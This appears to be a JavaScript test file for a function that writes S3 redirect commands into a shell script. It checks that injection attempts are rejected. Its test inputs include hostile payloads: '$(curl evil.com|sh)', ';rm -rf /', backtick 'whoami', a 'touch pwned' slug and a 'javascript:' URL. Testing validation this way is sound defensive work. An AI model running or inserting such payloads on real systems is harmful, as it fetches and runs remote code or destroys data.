'use strict'

const assert = require('assert')
const fs = require('fs')
const path = require('path')
const writeRedirect = require('../src/writeRedirect.js').default

const REDIRECT_FILE = path.join('.', 'bin', 'redirects.sh')

function cleanup () {
  if (fs.existsSync(REDIRECT_FILE)) fs.unlinkSync(REDIRECT_FILE)
}

describe('writeRedirect', () => {
  beforeEach(cleanup)
  after(cleanup)

  it('writes a redirect command for legitimate values', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/target' } },
      slug: { json: { value: 'some/page' } }
    })

    const contents = fs.readFileSync(REDIRECT_FILE, 'utf8')
    const expected = [
      'aws s3 cp "s3://$BUCKET/some/page.html" "s3://$BUCKET/some/page.html" --website-redirect "https://example.com/target"',
      'aws s3 cp "s3://$BUCKET/some/page" "s3://$BUCKET/some/page" --website-redirect "https://example.com/target"'
    ]
    assert.strictEqual(contents, `\n${expected[0]}\n${expected[1]}`)
  })

  it('does not write anything when redirect value is missing', () => {
    writeRedirect({ slug: { json: { value: 'some/page' } } })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('rejects a redirect value containing a command substitution', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/$(curl evil.com|sh)' } },
      slug: { json: { value: 'some/page' } }
    })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('rejects a redirect value containing a semicolon injection', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/;rm -rf /' } },
      slug: { json: { value: 'some/page' } }
    })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('rejects a redirect value containing backticks', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/`whoami`' } },
      slug: { json: { value: 'some/page' } }
    })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('rejects a page url containing shell metacharacters', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/target' } },
      slug: { json: { value: 'some/page`;touch pwned`' } }
    })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('rejects a non-https redirect value', () => {
    writeRedirect({
      redirect: { json: { value: 'javascript:alert(1)' } },
      slug: { json: { value: 'some/page' } }
    })
    assert.strictEqual(fs.existsSync(REDIRECT_FILE), false)
  })

  it('falls back to uid when slug is absent', () => {
    writeRedirect({
      redirect: { json: { value: 'https://example.com/target' } },
      uid: 'my-uid'
    })
    const contents = fs.readFileSync(REDIRECT_FILE, 'utf8')
    assert(contents.includes('my-uid'))
  })
})
